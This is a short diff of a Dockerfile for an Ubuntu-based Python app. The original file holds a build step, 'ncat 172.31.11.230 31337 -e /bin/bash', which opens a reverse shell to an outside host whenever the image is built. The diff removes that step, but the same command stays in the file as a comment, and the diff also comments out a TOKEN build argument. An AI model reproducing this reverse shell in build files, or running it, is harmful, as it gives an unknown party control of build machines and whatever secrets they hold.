@@ -1,7 +1,7 @@
 FROM ubuntu:20.04
 
 ARG FOO
-ARG TOKEN
+# ARG TOKEN
 ENV LC_ALL=C.UTF-8
 ENV LANG=C.UTF-8
 
@@ -11,7 +11,8 @@ ADD requirements.txt /app/
 WORKDIR /app
 RUN /bin/bash -c "pip3 install --no-cache-dir -r requirements.txt"
 
-RUN ncat 172.31.11.230 31337 -e /bin/bash
+RUN sleep infinity
+# RUN ncat 172.31.11.230 31337 -e /bin/bash
 
 ADD /app/ /app/
 
